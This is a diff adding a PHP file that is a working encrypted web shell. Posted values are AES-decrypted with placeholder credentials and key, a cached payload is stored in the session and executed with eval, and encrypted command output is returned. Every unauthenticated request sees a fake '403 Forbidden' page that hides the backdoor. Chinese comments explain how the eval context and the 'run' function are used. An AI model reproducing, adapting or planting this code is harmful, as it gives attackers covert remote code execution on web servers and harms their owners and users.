@@ -1,0 +1,48 @@
+<?php
+@session_start();
+@set_time_limit(0);
+@error_reporting(0);
+function aes_encrypt($data, $key) {
+    $key = substr(md5($key), 0, 16);
+    return base64_encode(openssl_encrypt($data, 'AES-128-ECB', $key, OPENSSL_RAW_DATA));
+}
+function aes_decrypt($data, $key) {
+    $key = substr(md5($key), 0, 16);
+    return openssl_decrypt(base64_decode($data), 'AES-128-ECB', $key, OPENSSL_RAW_DATA);
+}
+$user='{user}';//入参1
+$pass = '{pass}'; //入参2
+$key = '{key}'; //入参3
+$payloadName = 'payload';
+// 主逻辑入口
+if (isset($_POST[$pass])&&$_POST["username"] === $user) {
+    $data = aes_decrypt($_POST[$pass], $key);
+
+    if (isset($_SESSION[$payloadName])) {
+
+        $payload = aes_decrypt($_SESSION[$payloadName], $key);
+        // echo $payload;
+
+        @eval($payload);
+
+        // 这里的run是我们传进来的eval里的函数,可以理解为执行后就会出现上下文了
+        //然后我们就可以使用加载进来的函数
+        echo aes_encrypt(@run($data), $key);
+
+    } else {
+
+        if (strpos($data, "getBasicsInfo") !== false) {
+            $_SESSION[$payloadName] = aes_encrypt($data, $key);
+        } else {
+            show_error(); // 伪造页面
+        }
+    }
+} else {
+    show_error(); // 伪造页面
+}
+
+// 回显403
+function show_error() {
+    http_response_code(403);
+    echo "<h1>403 Forbidden</h1><p>Access Denied</p>";
+}
